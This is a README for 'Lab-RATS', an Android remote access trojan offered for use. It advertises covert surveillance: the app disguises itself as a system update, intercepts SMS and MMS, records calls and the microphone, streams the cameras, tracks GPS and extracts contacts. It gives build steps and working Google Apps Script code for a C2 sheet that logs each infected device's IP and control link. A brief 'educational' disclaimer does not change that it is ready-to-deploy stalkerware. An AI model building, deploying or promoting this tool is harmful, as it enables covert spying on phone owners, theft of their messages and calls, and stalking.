[![Screenshot-2026-06-28-at-8-21-29-AM.png](https://i.postimg.cc/rFGWqKMp/Screenshot-2026-06-28-at-8-21-29-AM.png)](https://postimg.cc/Yh9j324c)

# 🐀 Lab-RATS: Advanced Android Remote Administration Tool

**Lab-RATS** is a **powerful** and **lightweight Android Remote Administration Tool** *(RAT)* developed by **K4N3CO.LABS**. This tool allows for **remote monitoring and management** of Android devices through a user friendly **web-based interface** designed for speed and reliability. Built for the modern era, it fully supports the latest **2026 Android software releases** *(SDK 36)*.

---

## 🛠️ Core Features

-   📦 **Automated APK Generation**: Instantly build both `signed.apk` *(for production)* and `unsigned.apk`.
-   🆔 **Advanced Identity Control**: Fully customize **App Name**, **Package ID**, and **Minimum SDK**.
-   🕵️ **Stealth-First Design**: Randomly generates **Version Names** and **Version Codes** to masquerade as legitimate system updates.
-   🎨 **Smart Branding Engine**:
    -   **Auto-Density Scaling**: Resizes logos automatically for all Android screen densities.
    -   **Transparency Fixer**: Removes white backgrounds from logo assets automatically.
    -   **Legacy Bypass**: Forces "Legacy Mode" to ensure consistent icon branding on newer Android versions.

---

## 🚀 The Fun Stuff (Remote Capabilities)

-   🛰️ **Precision GPS Tracking**:
    -   **One Click** opens up **Google Maps** in Browser to the **exact current location** of the **Target Device**.
-   🖼️ **MMS Terminal (Game Changer!...You're Welcome in Advance...)**:
    -   **Browse & Extract**: Download **ANY Multimedia Message (MMS)** stored on the device.
    -   **Remote Dispatch**: Send **MMS/Picture Messages** directly from the target phone with a built-in **file browser** to pick media from your PC.
-   💬 **SMS Command Center**:
    -   **Full Interception**: Browse and copy every sent/received text message.
    -   **Remote Texting**: Send SMS from the target's number to any destination worldwide.
-   📸 **Optics & Surveillance**:
    -   **Live Camera Streaming**: View high-speed video feeds from both **front and back cameras**.
    -   **Background Recording**: Stealthily record high-quality video without any user-facing activity.
    -   **Instant Capture & Flashlight Blink**:
        -   Take **instant photos** from **any** available camera.
        -   Click the "**Blink Flash" button** to make the **Cameras Flashlight blink a few times** for fun.
-   🎙️ **Acoustics & Interception**:
    -   **Ambient Monitoring**: Live microphone recording for high-fidelity audio surveillance.
    -   **Call Recording**: Automatically records both incoming and outgoing phone calls.
-   📂 **Advanced Data Uplink**:
    -   **Integrated File Manager**: Navigate, download, and manage files across internal and external storage.
    -   **Standardized Navigation**: Every sub-page features a "Back to Terminal" node for rapid command switching.
-   📊 **Telemetry & Reporting**:
    -   **Full System Extraction**: Detailed hardware, network, and battery analytics.
    -   **Contact & Call Logs**: Instant extraction of the target's full contact list and communication history.
    -   **C2 Auto-Reporting**: Discrete reporting of device IP and status to a centralized **Google Sheet**.

---

## 📸 Screenshots

<p align="center">
  <b>--- &gt; APK Builder Interface &lt; ---</b><br>
  <a href='https://postimg.cc/64fbtNKM' target='_blank'><img src='https://i.postimg.cc/64fbtNKM/APK-builder-pic.jpg' border='0' alt='APK-builder-pic'></a>
</p>

<p align="center">
  <b>--- &gt; Android App (C2 Interface) on Target Device &lt; ---</b><br>
  <a href='https://postimg.cc/2VbLY8CV' target='_blank'><img src='https://i.postimg.cc/2VbLY8CV/Lab-RATS-APK-screen.jpg' border='0' alt='Lab-RATS-APK-screen'></a>
</p>

<p align="center">
  <b>--- &gt; Remote Web Control Panel (PC Interface) &lt; ---</b><br>
  <a href="https://postimg.cc/LJpWkwWh" target="_blank"><img src="https://i.postimg.cc/LJpWkwWh/Lab-RATS-WEBHomepage.png" alt="Lab-RATS-WEBHomepage"></a> 
  <a href="https://postimg.cc/ftmztxd9" target="_blank"><img src="https://i.postimg.cc/ftmztxd9/Lab-RATS-Camera-menu.png" alt="Lab-RATS-Camera-menu"></a> 
  <a href="https://postimg.cc/gX8zXvh6" target="_blank"><img src="https://i.postimg.cc/gX8zXvh6/Lab-RATS-Cam-record.png" alt="Lab-RATS-Cam-record"></a> 
  <a href="https://postimg.cc/YGYrG1FG" target="_blank"><img src="https://i.postimg.cc/YGYrG1FG/Lab-RATS-Audio.png" alt="Lab-RATS-Audio"></a> 
  <a href="https://postimg.cc/R3G2ZdXL" target="_blank"><img src="https://i.postimg.cc/R3G2ZdXL/Lab-RATS-SMS.png" alt="Lab-RATS-SMS"></a> 
  <a href="https://postimg.cc/HcXYcQMB" target="_blank"><img src="https://i.postimg.cc/HcXYcQMB/Lab-RATS-MMS.png" alt="Lab-RATS-MMS"></a> 
</p>

---

## 🧠 Direct IPv6 Access (The "Backdoor" Protocol)

During security research, a critical behavior in modern Android networking was discovered: devices on **mobile data** (and modern WiFi) are assigned **Public IPv6 Addresses**.

Unlike IPv4—which is heavily restricted by NAT and requires complex port forwarding—**IPv6 addresses are often directly routeable on the public internet.**

### How Lab-RATS Exploits This:
1.  **Distributed Server**: The app initializes a lightweight HTTP server on the Android device **(Port 8080)**.
2.  **Zero Configuration**: Because the device uses Public IPv6, you can access the terminal **directly from anywhere in the world** without router setup, firewalls, or tunnels (Ngrok/Pinggy).
3.  **Dynamic IP Solution**: Mobile networks rotate IPs frequently. Lab-RATS solves this by using a **Google Sheet as a "C2 Phonebook."**
4.  **Stealth Uplink**: The app silently detects its current IPv6 and posts the live link to your sheet. You simply open the sheet and click the latest link to regain control.

> **Effectively, this turns every infected device into a public web server, tracked by a private C2 phonebook.**

---

## 🛠️ Getting Started

### 1. Requirements
*   **Java 11 or 21** installed on your workstation.
*   A target **Android** device.
*   A **Google Sheet Webhook URL** for IP tracking.

### 2. Building the Payload
1.  **Extract** the repository zip.
2.  Navigate to `cd /Lab-RATS/app-builder/`.
3.  Execute the builder:
    *   **Windows**: `build.bat`
    *   **Linux/Mac**: `chmod +x build.sh && ./build.sh`
4.  Select **Option 1** and provide your configuration:
    *   **App Name**: (Default: LAB-RATS)
    *   **Google Sheet URL**: Your Apps Script URL (instructions below).
5.  Retrieve your `signed.apk` from the `output/` directory.

---

## 📊 Google Sheet C2 Setup

1.  Create a new **Google Sheet**.
2.  Go to **Extensions** → **Apps Script**.
3.  Replace the default code with this snippet:

```javascript
// Lab-RATS C2 Tracking Script
function doPost(e) {
  try {
    var sheet = SpreadsheetApp.getActiveSpreadsheet().getActiveSheet();
    var data = JSON.parse(e.postData.contents);
    sheet.appendRow([new Date(), data.device, data.network, data.ip, data.port, data.link]);
    return ContentService.createTextOutput("UPLINK_SUCCESS").setMimeType(ContentService.MimeType.TEXT);
  } catch (err) {
    return ContentService.createTextOutput("UPLINK_ERROR").setMimeType(ContentService.MimeType.TEXT);
  }
}

// Run once to initialize headers
function setupSheet() {
  var sheet = SpreadsheetApp.getActiveSpreadsheet().getActiveSheet();
  sheet.appendRow(["Timestamp", "Device", "Network", "IP Address", "Port", "Control Link"]);
  sheet.getRange("A1:F1").setFontWeight("bold").setBackground("#050505").setFontColor("#00f2ff");
}
```
4.  **Deploy** → **Web App** → Execute as **Me** → Access **Anyone**.
5.  Paste the generated URL into the APK Builder when prompted.

---

## ⭐ Support the Development

If you find **Lab-RATS** useful for your security research, please **Star ⭐ the project**—it drives further development!

**Contributions**: Bug reports, feature requests, and pull requests are always welcome.

**Donations (Optional)**:
`bc1q6lmkuju3kf7f8624fwt5qs7k5mf63mekgcnzf4` (BTC)

---

## ⚠️ Disclaimer
**This tool is strictly for educational and authorized security testing purposes.** The developers assume **NO responsibility** for any misuse or damage caused by this software. Use it responsibly.

---

© 2026 **K4N3CO.LABS**
